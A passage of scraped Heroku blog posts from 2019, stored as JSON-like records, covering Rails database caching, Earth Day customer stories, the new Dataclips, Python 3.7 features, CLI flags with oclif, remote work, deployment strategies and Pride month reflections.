cache_unless convenience methods: <% cache_if admin?, product do %>\n  <%= render product %>\n<% end %> Fragment caching is really only scratching the surface of what's possible in your caching layer, but it's a good place to start as it's relatively easy to set up and it's unlikely to create many issues for your application. I definitely encourage you to dig deeper on caching, but be aware that there are plenty of challenging bugs you can introduce if you're not careful. There's a reason caching is listed among the two hardest problems in computer science: naming things, caching, and off-by-one errors. Next Steps You can make a lot of performance progress just by identifying your bottlenecks, writing smarter queries, and caching. If you're pretty confident you have all of these pieces under control there's still plenty of work you can do to improve your database, even though we won't have time to cover them in depth here. You should make sure you're not leaking connections; if your applications isn't managing your connections well you may need the assistance of pgbouncer . You'll also want to be sure you know how to detect and address database locks in your application. If you suspect locking is causing you issues you might benefit from the pg-extras CLI plugin mentioned earlier. The plugin will add a pg:locks command to your CLI tool to view all current locks in your database and how long they've been held. Finally you're going to want to learn about database bloat and how Postgres deals with it, and specifically why you might want to manage the cleanup process ( VACUUM ) yourself. You can learn more about the mechanism Postgres uses to prevent bloat and how you can manage it on Heroku in the Managing VACUUM on Heroku Postgres article on the Heroku Dev Center. Experiment Hopefully you've found some steps you can take here to optimize your database interactions in Rails. Remember to experiment with any change you make to the way you query your data, and make sure you have the metrics in place to understand your progress. Good luck with your database adventures, may all your queries be fast and efficient. Jonan caching redis vacuum mvcc performance database postgresql ruby rails", "date": "2019-04-15,"},
{"website": "Heroku", "title": "Finding Inspiration in Apps on Earth Day", "author": ["Sally Vedros"], "link": "https://blog.heroku.com/earth-day-2019", "abstract": "Finding Inspiration in Apps on Earth Day Posted by Sally Vedros April 22, 2019 Listen to this article Earth Day inspires millions of people around the world to take action on behalf of our beautiful planet. For some, this means getting out and volunteering for a day with an environmental group. For others, it’s about changing our daily habits to be more mindful about things like recycling, driving, or water usage. But a growing sector is taking earth-friendly action at scale. From nonprofits to NGOs to green businesses, visionary entrepreneurs are using modern technology to address Planet Earth’s very modern problems. I often work with Heroku customers to help them share their story with the world. Along the way, I find myself constantly inspired by so many innovative apps that change lives in so many ways. This Earth Day, I took a look back at a few environment-themed customer stories that have crossed my desk. Each approach the topic from very different angles: clean water access, disaster relief, data-driven predictive models, and sustainable food production. charity:water Nearly 663 million people don’t have access to clean drinking water—that’s one in ten people on the planet. Lack of safe water and basic sanitation causes 80% of diseases and more deaths every year than any form of violence, including war. Founded in 2006, charity: water works to reduce these numbers to zero in our lifetime by funding clean water projects like new wells and systems for water filtration and sanitation. To boost their infrastructure projects, charity: water uses the best of modern technology and develops innovative apps running on Heroku. Their water monitoring dispatch app aggregates water flow data from sensors in the field, tracks and monitors usage, and helps inform the organization’s sustainability initiatives. The app also captures survey and maintenance data from field staff and helps them better manage logistics and operations. Here at home, charity: water operates a peer-to-peer fundraising platform, with 100% of funds going directly to water projects. Got a birthday coming up? Why not run your own campaign and invite friends to give the ultimate gift to those who need it most—clean water. Read the full story > KeralaRescue In August 2018, the southern Indian state of Kerala experienced the worst flood in nearly a century. Unusually heavy monsoon rainfall had overwhelmed the local dams and water systems. Hundreds of people lost their lives and nearly a million were evacuated. In the midst of the chaos, one developer kept his cool and saw an opportunity to use his skills to help. In collaboration with others from his college, Bizwas got straight to work on a Django web app that would allow refugees and camps to specify their needs, like water or medicine, and coordinate volunteer efforts. In a mission-critical scenario where every minute matters, Heroku’s free plan enabled Bizwas to get his MVP live in barely 14 hours with git push heroku master as his mantra. The requests for aid poured in, not only for supplies but also to rescue people who were still in danger. As word about the app spread, developers around the world offered to help extend the app and an open source community was born. The app’s data was also put to work as other organizations used it to inform their own disaster relief studies and initiatives. A year later, the KeralaRescue app serves a model for what can be accomplished by a few dedicated technicians in the face of nature’s toughest challenges. Read the full story > DrivenData Data science and machine intelligence can help make the world a better place—for all beings. DrivenData partners with social impact and environmental organizations to explore their data sets. They invite the global data science community to help address tough challenges by submitting their best predictive models or algorithms to a competition platform on Heroku. Some of the winners become open source tools to help others drive positive change. One of their recent environmental projects focused on helping researchers, conservationists, and park managers better monitor wildlife. Camera traps in the wild capture photos and videos whenever animals pass by. But it takes hours to manually sift through such a massive amount of footage, including false positives, to identify animals. DrivenData partnered with the Max Planck Institute for Evolutionary Anthropology and hosted a competition to help automate this process. Data scientists from over 90+ countries drew on more than 300,000 video clips to train machine learning models. The winning computer vision algorithm became Zamba , an open source Python package that identifies 23 animals in video data, and Zamba Cloud a ready-to-use web tool running on Heroku. The project makes it easier for wildlife experts to advance the impact of their work. Interested in data science? Check out DrivenData’s current lineup of open competitions and submit your best solution. Read the full story > Freight Farms Consumers demand locally grown, sustainably produced food with minimal impact to the environment. But for many of us city dwellers, “local” food may still have to travel hundreds of miles to get to our plates. The founders of Freight Farms re-imagined urban farming and created a mobile indoor growing environment that could be placed in any open space within a city or suburb. This makes it easier for anyone to be a farmer and efficiently produce food at scale within their own community. The company’s flagship product— the Greenery —is a hydroponic farm built inside a 40’x8’ upcycled shipping container, making it inherently self-contained and mobile. What makes Freight Farms a truly modern food enterprise is the technology behind the farm. Each of their farm units is connected to the company’s IoT network and apps running on Heroku. Their farmhand platform allows farmers to easily monitor and fine-tune their operations in real time, as well as order supplies when needed. Freight Farms’ “green-tech” approach to agriculture helps increase yields and decrease impact on the environment, keeping local food production truly “local.” Read the full story > I hope these remarkable stories have inspired you too. Maybe you’ll take some simple steps for Earth Day, or maybe you’ll develop your own apps for good. Wherever your inspiration leads you, I wish you a Happy Earth Day! Earth Day customer stories developer life", "date": "2019-04-22,"},
{"website": "Heroku", "title": "A Dialog with Your Data Using the New Dataclips", "author": ["Becky Jaimes"], "link": "https://blog.heroku.com/dialog-with-data-new-dataclips", "abstract": "A Dialog with Your Data Using the New Dataclips Posted by Becky Jaimes April 16, 2019 Listen to this article The data we store holds value, but refining data into meaning remains a difficult task. Over the last few months, we've taken a step back to figure out what we can do to help our users cross that divide, and rebuilt Heroku Dataclips from scratch with that goal in mind. The result is an experience that makes accessing and working with your data easier than ever, enabling anyone on your team familiar with SQL to take advantage of your most valuable asset without the need for specialized tools or knowledge of the database. Dataclips is a flexible, lightweight way to query your data in Heroku Postgres and share the results. At Heroku, we use them regularly across all of our departments. Engineers create dataclips to diagnose issues and produce actionable lists. Our Business Operations team crafts evergreen reports on the health of our business, enabling our product teams to prioritize work. Product managers investigate user behavior and monitor feature uptake. Everyone uses dataclips as a rock-solid conduit for getting data into other tools. They are a window into systems of record — for many of our Heroku Postgres customers and us. How could we democratize access to the most valuable asset of every business? We investigated how our users used (and abused!) dataclips as part of their daily routines, and came away with the following observations: Data grows more opaque with time. As data grows and schemas evolve, knowing what to query and how to query can become a barrier of institutional knowledge. It's a hurdle for experienced veterans and new employees alike, preventing them from making data-driven decisions. A dialogue with data requires quick iterations. If users need to ask many questions on their path to the right question, then those questions need to be quick to write. Dataclips are for sharing. Asking the right question is only half the battle. How we communicate the answers to others depends very much on who that audience is. Are they a colleague? A manager? A customer? How could we improve the presentation of data, presenting the essential with a minimum of noise? Maximizing our data-to-ink ratio is not only healthy for visualizations but applies to our interfaces as well. Data pipelines often start with Dataclips. We have customers using Heroku Dataclips as a lightweight ETL framework, performing complex aggregations as the first stage in their existing data workflows. We can't imagine covering all of these use cases. How could we make it easier for our customers to get data out of a dataclip and into their tools? With these themes in mind, we set out to take what was already great about Dataclips and make it better. Let's take a look at some of the highlights in this new release: Introducing the New Dataclips Authoring We want it to be faster to write queries, and easier to figure out how to query. The new schema explorer is one of our favorite things in this release — everyone on your team who can edit the dataclip can now quickly see all of the tables, the associated columns for each table, and their types. In addition, the editor supports autocomplete for SQL, Postgres functions, and your table names. Taken together these features make writing queries more like writing code in your favorite editor, and provide a significant productivity boost by allowing you to focus on the right questions to ask of your data versus worrying about syntax and the names of your columns. We are also particularly excited about the ability to save private drafts of queries and, when ready, publishing them for anyone with datastore access to see. Sharing The previous one-size-fits-most sharing approach for dataclips worked well for some use cases, but users asked us for a sharing model that gave them more fine-grained control over who can see a dataclip’s query separately from who can see the results. Now you can share the read-only results of a dataclip with specific Heroku users, entire Heroku Teams, or publicly without exposing the underlying query or datastore information. Published queries will remain editable by any Heroku user with sufficient access to the clip’s database. For more information on Dataclips access and visibility, see the Dev Center article . Viewing Results Say goodbye to waiting for data to refresh. We've made improvements to how we execute clips so you’re looking at the freshest data. While we have always executed clips that you have open in your browser once a minute, we’ve introduced background execution in this release. For any clip that has been accessed in the last week, we automatically refresh the clip once an hour. Now you and the tools you use see current data, so you can make confident, rapid decisions. Dataclips have always been a great way to share results in tabular form; now you can instantly visualize time series data—results containing a date or timestamp column and a column of numeric data—as a bar or line chart right from within the comfort of the Dataclips UI. We’ve also made lots of little touches to the UI such as sticky column headers, and better responsive behavior, to speed up your dialog with data. Customer Success Spotlight: Busbud Heroku customer Busbud provides its users with the fastest experience to book bus tickets online. Data is at the core of their business; the new Dataclips has allowed them to increase accessibility to their data and make better decisions: “Dataclips allow our employees to explore, mashup and consume our data, and they've become a staple in performance reports, experiment analysis and discussions. But they were almost exclusively authored by a technical subset of our employees. The new changes have made writing dataclips even more accessible - we now have people across the company excited to learn SQL so they can explore the data they need to make great decisions every day. The new schema explorer and autocomplete features really make it easier to write dataclips and the charting features allow you to understand the data at a glance. The draft and published features allow our employees to collaborate on dataclips to make sure they get them right before including them in the catalog - I'm excited to continue using it with my team to help them improve their SQL skills and increase their autonomy.” —Mike Gradek, Co-founder and CTO, Busbud.com Get Started The Dataclips interface now lives in the same web dashboard as all of our other data-related features: http://data.heroku.com/dataclips . To try out the new Dataclips, simply select Dataclips from the tab menu. We’ve also teamed up with the good folks at Code for America so you can experience the new Dataclips with real-world data using their Open311 Data Set. See some initial results (and dig into some of the data yourself). Also, check out our podcast channel on April 18, 2019, for a deeper dive into the making of the new Dataclips. data sharing database schema time-series data visualization collaboration sql postgres database dataclips", "date": "2019-04-16,"},
{"website": "Heroku", "title": "Getting to Know Python 3.7: Data Classes, async/await and More!", "author": ["Casey"], "link": "https://blog.heroku.com/python37-dataclasses-async-await", "abstract": "Getting to Know Python 3.7: Data Classes, async/await and More! Posted by Casey April 29, 2019 Listen to this article If you're like me, or like many other Python developers, you've probably lived (and maybe migrated) through a few version releases. Python 3.7(.3), one of the latest releases, includes some impressive new language features that help to keep Python one of the easiest, and most powerful languages out there. If you're already using a Python 3.x version, you should consider upgrading to Python 3.7. Read on to learn more about some of the exciting features and improvements. Data Classes One of the most tedious parts about working with Python prior to 3.7 in an object-oriented way was creating classes to represent data in your application. Prior to Python 3.7, you would have to declare a variable in your class, and then set it in your __init__ method from a named parameter. With applications that had complex data models, this invariably led to a large number of boilerplate model and data contract code that had to be maintained. With Python 3.7, thanks to PEP-557 , you now have access to a decorator called @dataclass , that automatically adds an implicit __init__ function for you when you add typings to your class variables. When the decorator is added, Python will automatically inspect the attributes and typings of the associated class and generate an __init__ function with parameters in the order specified. from typing import List\nfrom dataclasses import dataclass, field\n\n@dataclass\nclass Foo:\n    name: str\n    id: str\n    bars: List[str] = field(default_factory=list)\n\n\n# usage\n\na_foo = Foo(\"My foo’s name\", \"Foo-ID-1\", [\"1\",\"2\"]) You can still add class methods to your data class, and use it like you would any other class. For JSON support, see the library dataclasses-json on PYPI. Asyncio and the async / await Keywords The most obvious change here is that async and await are now reserved keywords in Python. This goes hand in hand with some improvements to asyncio, Python's concurrency library. Notably, this includes high-level API improvements which make it easier to run asynchronous functions. Take the following as an example of what was required to make a function asynchronous prior to Python 3.7: import asyncio\nloop = asyncio.get_event_loop()\nloop.run_until_complete(some_async_task())\nloop.close() Now in Python 3.7: import asyncio\nasyncio.run(some_async_task()) breakpoint() In previous versions of Python adding in a breakpoint to use the built-in Python debugger ( pdb ) would require import pdb; pdb.set_trace() . PEP-553 adds the ability to use a new keyword and function, called breakpoint , used like below: do_something()\nbreakpoint()\ndo_something_else() When running from a console, this will enter straight away into pdb and allow the user to enter debug statements, evaluate variables, and step through program execution. See here for more information on how to use pdb . Lazy Loading via Module Attributes Some experienced Python users might be familiar with __getattr__ and dir for classes and objects. PEP-562 exposes __getattr__ for modules as well. Without diving into the realm of technical possibilities that this exposes, one of its clearest and most obvious use cases is that it now allows for modules to lazy load. Consider the example below, modified from PEP-562 , and its usage. /mymodule/__init__.py import importlib\n\n__all__ = ['mysubmodule', ...]\n\ndef __getattr__(name):\n    if name in __all__:\n        return importlib.import_module(\".\" + name, __name__)\n    raise AttributeError(f\"module {__name__!r} has no attribute {name!r}\") /mymodule/mysubmodule.py print(\"Submodule loaded\")\n\nclass BigClass:\n    pass /main.py import mymodule\nmymodule.mysubmodule.BigClass # prints Submodule loaded Notice that although we imported mymodule in this example, the submodule containing BigClass didn't load until we called it. Context Variables When using async/await functions in the Python event loop prior to 3.7, context managers that used thread local variables had the chance to bleed values across executions, potentially creating bugs that are difficult to find. Python 3.7 introduces the concept of context variables, which are variables that have different values depending on their context. They're similar to thread locals in that there are potentially different values, but instead of differing across execution threads, they differ across execution contexts and are thus compatible with async and await functions. Here's a quick example of how to set and use a context variable in Python 3.7. Notice that when you run this, the second async call produces the default value as it is evaluating in a different context. import contextvars\nimport asyncio\n\nval = contextvars.ContextVar(\"val\", default=\"0\")\n\nasync def setval():\n   val.set(\"1\")\n\nasync def printval():\n   print(val.get())\n\nasyncio.run(setval()) # sets the value in this context to 1\nasyncio.run(printval()) # prints the default value “0” as its a different context Order of Dictionaries Preserved Python dictionaries were considered unordered dictionaries for many versions, which meant that you could write the following in Python 3.6 and earlier, and expect an out-of-order result when iterating over the keys. >>> x = {'first': 1, 'second': 2, 'third': 3}\n>>> print([k for k in x])\n['second', 'third', 'first'] For those prior versions, there was OrderedDict available from collections to the rescue, which provided the strong ordering guarantees needed with certain use cases. In Python 3.6 dictionaries were re-implemented to be ordered dictionaries, and now in Python 3.7 it is officially part of the language specification. This means that dictionary order can now be relied on but also must be accounted for when considering backwards compatibility. Don't expect usage of OrderedDict to go away anytime though; it is still in Python 3.7, and has more advanced operations and different equality comparisons than the standard dict . Also, this update has proven to be one of the more unpopular updates to Python 3.7. It allows for a developer to ambiguously define an ordered dict when he/she didn't mean to. Optimizations to Python 3.7 Still not sure if you should check out Python 3.7? You should know that Python 3.7 has numerous performance improvements, notably: Python startup time has been reduced between 10-30% on various operating systems. Typing operations are faster. List.sort and sorted methods have improved between 45-70% for common cases. dict.copy() is now 5.5 times faster. namedtuple creation via collections.namedtuple() is 4-6 times faster. For a complete list, check out the official release notes . If you want a deeper dive into some of the Python 3.7 language features, check out this lightning talk I gave at the PyCascades conference. Or try it out by deploying a Python app to Heroku. As of April 2019, Python 3.6.8 is the default version installed if you don’t explicitly specify a version in a runtime.txt file . Put python-3.7.3 in it to try out all these new Python features. 👋 Heroku is a Diamond Sponsor of PyCon 2019 , May 1-9. If you'll be there, please come say hi to the team at the Heroku booth. 🐍 breakpoint asyncio dataclasses python", "date": "2019-04-29,"},
{"website": "Heroku", "title": "CLI Flags in Practice + How to Make Your Own CLI Command with oclif", "author": ["Casey Watts"], "link": "https://blog.heroku.com/cli-flags-get-started-with-oclif", "abstract": "CLI Flags in Practice + How to Make Your Own CLI Command with oclif Posted by Casey Watts May 09, 2019 Listen to this article Editor's note: If you like CLIs, you should check out oclifconf taking place on Friday, May 31st in San Francisco. It’s the first community get-together for oclif! Space is limited so let us know soon if you are interested in joining. What is it that makes working from the command line so empowering? It can feel archaic at times, sure, but when you remember the right sequence of words, characters, and symbols for what you’re trying to do, it hits you with a sense of accomplishment and mastery over your tools that no graphical interface can compete with. So what better way to continue your adventures as a developer than by developing your own CLI tool? In this post, we’ll go over what type of parameters CLI commands take—also known as \"flags\", \"arguments\", and sometimes \"options.” Then, we’ll start you off with oclif , the CLI framework that makes it easy to create new CLI commands! The Syntax of a CLI Command Any command line interface command has a few standard \"parts of speech.” As a user of CLI tools, knowing these parts of speech can help you make fewer typos. It can also help you understand complex commands other people share with you more quickly (like these ). If you are designing a CLI tool it is even more important to understand these parts of speech, so you can come up with the most ergonomic interface for your users. Yes, a CLI is a user interface! Some of you may recognize diagrams like the one below from elementary or primary school. Fortunately, understanding how CLI commands are structured isn’t going to feel like this. CLI commands are pretty straightforward compared to the typical English sentence. For starters, let’s look at the parameters that appear to the right of CLI commands. Sure, there are many ways you can pass data to a CLI command, but these three types of parameters to the \"right\" of the command might be the most common: argument, long flag, and short flag. These two formats for flags are the standard for GNU-style flags. Not all CLIs follow this convention, but it has become the most popular style on Unix-like and POSIX compliant operating systems. What better way for us to start than with the ls command? It’s one of the most common and simplest commands on Unix-like operating systems. It simply lists the contents of a directory. Command $ ls This command, ls , works on its own, as a standalone command. Without any parameters, this command will list the contents of the current directory. Argument $ ls . But you can do the same thing with an argument! Turns out that ls . and ls are the same thing, with ls simply using an implied . directory. For those that don’t remember or don’t know, . always refers to the current directory. But now, the argument syntax makes it possible for you to pass any directory path to ls , and to get a look at what’s in there. $ ls /home/casey/code/some-repo-name An argument is anything to the right of a command that is not a flag (we’ll get to flags next). And fortunately, an argument can come before or after flags–it can coexist with them happily. Long Flag To list files that are normally hidden (like ~/.bashrc ), you can use a flag on the ls command. ls --all is the long flag form. A long flag always uses a double dash, and it is always represented by multiple characters. $ ls --all $ ls . --all Short Flag There is also a short flag form of this flag: ls -a . The a is short for all in this case. A short flag always uses a single dash, and it is always represented by a single letter. $ ls -a $ ls . -a Short flags can stack too, so you don't need a separate dash for each one. Order does not matter for these, unless passing a flag argument . $ ls -la Flag Argument Many flags accept an option called a \"flag argument\" (not to be confused with a \"command argument\"). In general a command's parameters can be in any order, but flags that accept options must have the option directly after the flag. That way, the command doesn’t get confused by non-flag arguments. For an example, here the -x flag does not accept an option but the -f flag does. archive.tar is the option being passed to -f . Both of these are valid. $ tar -x -f archive.tar $ tar -xf archive.tar A flag and its option can be separated by a space or an equals sign = . Interestingly, short flags (but not long flags) can even skip the space, although many people find it much easier to read with the space or equals sign.\nThese three are all valid and equivalent. $ tar -f archive.tar $ tar -f=archive.tar $ tar -farchive.tar Long flags must have a space or equals sign to separate the flag from its option. $ git log --pretty=oneline $ git log --pretty oneline Other Ways of Passing Data We've covered parameters, which are arguments, long flags, and short flags. There are two other ways to pass data to a command: environment variables (\"env vars\") , or standard input (\"stdin\") . These won't be covered in this blog post, but check out the links to learn more about them. Building a New Command With oclif Scenario: we want to design an oclif command that takes an input like \"Casey\", and returns \"hi, Casey!\". There are many ways the user could pass this in. Here we show an example of each type of input using an argument, a long flag, and a short flag. First, let’s get started with oclif . Getting a CLI app going is very, very straightforward with it. Open up your terminal and type the following, which will use npx to run oclif and then create a new CLI. npx is a pretty useful command to simplify running CLI tools and other executables hosted on the npm registry . $ npx oclif single greet-me We won’t go into the details of the single (vs multi ) argument above. Check out the oclif documentation for more about this. Now, you’ll get the chance to specify some details of your new CLI, including the command name. When it asks you, just press enter, choosing the deafult. It’ll take the greet-me argument you passed into the above command. You can choose the default for most of the questions it asks you. The answers won't make much of a difference for this simple tutorial. However, they are very important to answer accurately if you will be sharing your CLI command with others. ? npm package name: greet-me\n? command bin name the CLI will export: greet-me\n\n...\n\nCreated greet-me in /home/casey/code/greet-me Now that we have things set up, let’s check out what’s happening in /greet-me/src/index.ts , where all the important argument and flag-handling code for your CLI will live. const {Command, flags} = require('@oclif/command')\n\nclass GreetMeCommand extends Command {\n  async run() {\n    const {flags} = this.parse(GreetMeCommand)\n    const name = flags.name || 'world'\n    this.log(`hello ${name} from ./src/index.js`)\n  }\n}\n\nGreetMeCommand.description = `Describe the command here\n...\nExtra documentation goes here\n`\n\nGreetMeCommand.flags = {\n  // add --version flag to show CLI version\n  version: flags.version({char: 'v'}),\n  // add --help flag to show CLI version\n  help: flags.help({char: 'h'}),\n  name: flags.string({char: 'n', description: 'name to print'}),\n  // flag with no value (-f, --force)\n  force: flags.boolean({char: 'f'}),\n}\n\nmodule.exports = GreetMeCommand What we can see here is that it accepts a few different flag names out the gate ( version , name , help , and force ) by registering them in the flags object. …\n    version: flags.version({char: 'v'}),\n… Here, with the version flag, the key acts as the ‘version’ long flag name, and on the right side of the expression, we use the method's in oclif ’s flags module to register a flag, a type it’ll return, and the short flag name. Now, we’re ready to rock: let’s see just how many things oclif handles out of the box by running the CLI. Right now, it’s only available with a slightly awkward command. $ ./bin/run But npm allows us to symlink this to the name of our CLI. $ npm link\n\n...\n\n$ greet-me\n> hello world from ./src/index.ts Excellent! Try passing your name in using -n or --name next–and see if there are any other ways oclif will let you pass in arguments. SIGTERM While that’s all we’re going to cover in this blog post, oclif has a growing community and its code is open source so there are lots of other ways to learn more. Here are some links to continue exploring oclif. An episode of the Code[ish] podcast about oclif with Jeff Dickey, one of the creators of oclif, and Nahid Samsami, Heroku’s PM for oclif oclifconf details if you’ll be in the San Francisco Bay Area on Friday, May 31 oclif’s GitHub repository oclif’s Spectrum community command line flags typescript javascript oclif CLI", "date": "2019-05-09,"},
{"website": "Heroku", "title": "On Making Work Less Remote: How the Heroku Team Works Together", "author": ["Charlie Gleason"], "link": "https://blog.heroku.com/on-making-work-less-remote", "abstract": "On Making Work Less Remote: How the Heroku Team Works Together Posted by Charlie Gleason May 13, 2019 Listen to this article At a rough estimate over half the team at Heroku are remote workers, including myself. We are affectionately called Remokai. We hail from a dizzying number of countries, communicating through email, video calls, and instant messages, from cities, towns, beaches, and parks—a few weeks ago I had a meeting while cycling through central London. It's an incredible mix of people, from a diverse range of backgrounds, living and working in ways that would have been impossible only a short time ago. “For the most remote place I’ve worked... I did try to stay focused on the VTO (volunteering) project I was there for, but I’ll admit I checked my email from the plaza in the center of Pilar, Paraguay.” Hailey Walls Customer Solutions Architect That said, one of the challenges of working remotely is that it can be, well, remote. To counter that, we meet up in real life four times a year to collaborate, catch up, and celebrate our successes. And in between those times, we encourage new initiatives to help all our team, remote and locally engaged, feel a little closer together. From tools like a Slack app that helps you find co-workers nearby, to monthly lightning talks in a number of regions, everyone works to stay engaged and connected. In a recent weekly coffee hangout we gave tours of our houses, flats, and current work places, and discovered genuinely fascinating, humanising, and hilarious things about one another—including a co-worker with an incredible collection of 200+ boots. “As for the most remote place I've worked, it probably would be when I was deploying code to production while driving to the Dead Sea in Israel while tanks passed us by...” Terence Lee Principal Engineer on Languages That got us talking about sharing and celebrating our remote spaces. We issued a question to our remote crew: can you send us a photo of where you work? “The most remote place I've worked would be popup camping on a beach in Northern Florida. Challenging, but doable.” Patti Sutton Lead Splunk Reliability Engineer The response was awesome, so we wanted to share them (with permission) to give a glimpse into the people and environments that help to make Heroku what it is. “I got word of moving onto the next stage of the interview process days before a climbing trip. Since the trip was already planned I decided to make use of the ability to work remotely, and so I did my starter project at the campsite in a super uncomfortable camping chair while my friends went climbing in the forest.” Hannes Fostie Marketing Web Ops Engineer Listen to the Code[ish] podcast “ Making Remote Work Work ”, in which five different Herokai talk about what's worked (and what hasn't), ranging from their home office setup, the necessity in establishing a schedule, staying engaged with the rest of the company, and how to get a strong Internet connection atop the Rocky Mountains. Herokai remote work", "date": "2019-05-13,"},
{"website": "Heroku", "title": "Six Strategies for Deploying to Heroku", "author": ["Jason Skowronski"], "link": "https://blog.heroku.com/six-strategies-deploy-to-heroku", "abstract": "Six Strategies for Deploying to Heroku Posted by Jason Skowronski June 19, 2019 Listen to this article There are many ways of deploying your applications to Heroku—so many, in fact, that we would like to offer some advice on which to choose. Each strategy provides different benefits based on your current deployment process, team size, and app. Choosing an optimal strategy can lead to faster deployments, increased automation, and improved developer productivity. The question is: How do you know which method is the \"best\" method for your team? In this post, we'll present six of the most common ways to deploy apps to Heroku and how they fit into your deployment strategy. These strategies are not mutually exclusive, and you can combine several to create the best workflow for your team. Reading this post will help you understand the different options available and how they can be implemented effectively. Deploying to Production with Git Our first method is not only the most common, but also the simplest: pushing code from a Git repository to a Heroku app . You simply add your Heroku app as a remote to an existing Git repository, then use git push to send your code to Heroku. Heroku then automatically builds your application and creates a new release . Because this method requires a developer with full access to manually push code to production, it's better suited for pre-production deployments or for projects with small, trusted teams. Pros: Simple to add to any Git-based workflow Supports Git submodules Cons: Requires access to both the Git repository and Heroku app GitHub Integration If your repository is hosted on GitHub, you can use GitHub integration to deploy changes directly to Heroku. After linking your repository to a Heroku app, changes that are pushed to your repository are automatically deployed to the app. You can configure automatic deployments for a specific branch, or manually trigger deployments from GitHub. If you use continuous integration (CI), you can even prevent deployments to Heroku until your tests pass. GitHub integration is also useful for automating pipelines . For example, when a change is merged into the master branch, you might deploy to a staging environment for testing. Once the change has been validated, you can then promote the app to production. Pros: Automatically deploys apps and keeps them up-to-date Integrates with pipelines and review apps to create a continuous delivery workflow If you use a CI service (such as Heroku CI ) to build/test your changes, Heroku can prevent deployment when the result is fail Cons: Requires administrator access to the repository, so it’s only useful for repositories you own Does not support Git submodules Heroku Review Apps When introducing a change, chances are you want to test it before deploying it straight to production. Review Apps let you deploy any GitHub pull request (PR) as an isolated, disposable instance. You can demo, test, and validate the PR without having to create a new app or overwrite your production app. Closing the PR destroys the review app, making it a seamless addition to your existing workflows. Pros: Can automatically create and update apps for each PR Supports Docker images Supports Heroku Private Spaces for testing changes in an isolated environment Cons: Requires both pipelines and GitHub integration to be enabled Deploying with Docker Docker lets you bundle your apps into self-contained environments, ensuring that they behave exactly the same both in development and in production. This also gives you more control over the languages, frameworks, and libraries used to run your app. To deploy a container to Heroku , you can either push an image to the Heroku container registry , or build the image automatically by declaring it in your app's heroku.yml file. Pros: Automatically generate images, or push an existing image to the container registry Consistency between development and production Compatible with Heroku Review Apps Cons: If your app doesn’t already run in Docker, you’ll need to build an image Requires you to maintain your own stack Does not support pipeline promotions Using Hashicorp Terraform Infrastructure-as-code tools like Hashicorp Terraform can be helpful to manage complex infrastructure. Terraform can also be used to deploy a Heroku app. Despite it not being officially supported by Heroku, Terraform is being used by many Heroku users. Using Terraform with Heroku, you can define your Heroku apps with a declarative configuration language called HCL. Terraform automates the process of deploying and managing Heroku apps while also making it easy to coordinate Heroku with your existing infrastructure. Plus, Terraform v0.12 now allows you to store Remote State in a PostgreSQL database. This means you can now run Terraform on a Heroku dyno storing Terraform state in a Heroku Postgres database. For an example, check out a reference architecture using Terraform and Kafka. Pros: Automates Heroku app deployments Allows you to deploy Heroku apps as code Simplifies the management of large, complex deployments Allows you to configure multiple apps, Private Spaces as well as resources from other cloud providers (e.g. AWS, DNSimple, and Cloudflare) to have a repeatable, testable, multi-provider architecture. Cons: Requires learning Terraform and writing configuration if you don’t use it already The 'Deploy to Heroku' Button What if deploying your app was as easy as clicking a button? With the 'Deploy to Heroku' button , it is! It’s great for taking an app for a test run with default settings in a single click, or to help train new developers. This button acts as a shortcut allowing you to deploy an app to Heroku from a web browser. This is great for apps that you provide to your users or customers, such as open source projects. You can parameterize each button with different settings such as passing custom environment variables to Heroku, using a specific Git branch or providing OAuth keys. The only requirements are that your source code is hosted in a GitHub repository and that you add a valid app.json file to the project's root directory. We’ve even heard of one company that adds a button to the README for each of their internal services. This forces them to keep the deploy process simple and aids new hires getting up to speed with how services are deployed. A 'Deploy to Heroku' button. Pros: Easy to add to a project's README file or web page Easy to use: simply click the button to deploy the app Provides a template with preconfigured default values, environment variables, and parameters Cons: Does not support Git submodules Apps deployed via button do not auto-update when new commits are added to the GitHub repo from which it was deployed Not a good workflow for apps that you need to keep up to date because buttons can only create new apps and the deployed app is not automatically connected to the GitHub repo from which it came Which Should I Choose? The method you choose depends on your specific deployment process, your requirements, and your apps. For small teams who are just getting started, deploying with Git is likely to be your first deployment due to its simplicity. The Heroku Button is equally straightforward, letting you deploy entire apps with a single click. If you use continuous integration or release frequently, integrating with GitHub can simplify this process even more by doing automated deployments when you commit your code. This is a big improvement over deploying on an IaaS system because Heroku manages the entire process automatically. As your requirements get more sophisticated, add the other strategies as needed. When your application is running in a production environment and you need quality control, you may want to add pipelines to get the advantages of review apps, automated testing, and staging environments. If you need a custom stack, then you can do so with Docker. As you add more complex infrastructure components, then add Terraform. Advanced teams will use a combination of strategies: For example, you may choose to deploy a Docker image by creating a review app from a GitHub pull request, testing the review app, then manually deploying the final version using git push . Ready to give one of these methods a try? Sign up for a free Heroku account and start deploying your apps in minutes. git heroku button terraform GitHub review app deploy", "date": "2019-06-19,"},
{"website": "Heroku", "title": "Pride Runs Deep", "author": ["Margaret Francis"], "link": "https://blog.heroku.com/pride-runs-deep", "abstract": "Pride Runs Deep Posted by Margaret Francis July 01, 2019 Listen to this article Pride is a word with many meanings. It can mean a job well done. It can mean satisfaction in who you are or what you stand for. For me, it is all of that and more. It is one of the values that runs deeply at Heroku and what keeps me here -- pride in the work we do, pride in how we do it, and most importantly, pride in our people. One of the most moving things I have seen this past month is this Heroku Pride wallpaper on peoples’ screens all around the office. At this 50th anniversary of the Stonewall riots, and the conclusion of Pride month, on the day after the Pride parade here in San Francisco and in so many other places far and near, big and small, we asked for reflections from our team about what pride means to them.  We are sharing some of their responses here. \"Pride, to me, is about feeling comfortable being your most authentic self. When it comes to the workplace, diversity has measurable benefits for teams and organisations, and pride is an absolute cornerstone of that. By celebrating our differences, we create space for people to participate, and to flourish.\" — Charlie Gleason \"I am proud to work for a company that represents and stands up for the thing that is most important in this world: equality. I was never prouder than seeing a rainbow banner gracing the home pages of heroku.com and jp.heroku.com and the reception that they received. I am humbled by those around me constantly. My goal is to always be true to who I am and who everyone else is - our differences are what make us all better people.\" — Jennifer Hooper \"Pride is a celebration of who we are and how far we’ve come. The glitter, the rainbow tutus, and the parades all serve as an important reminder that we’re visible, vocal, and proud. However for me, Pride is also a time of remembrance and reflection, both on our past and what’s in store for the future. From Stonewall to Obergefell v. Hodges, there are some tremendous moments in history to celebrate as an American. But the fight isn’t over. Transphobia and racism still exist inside the LGBTQ community and in the world at large. Many LGBTQ people around the world are still struggling for the rights I have in the US, and even here, sexual orientation and gender identity aren’t protected classes under federal law. Pride is a party but it’s also a moment of pause on a longer journey for 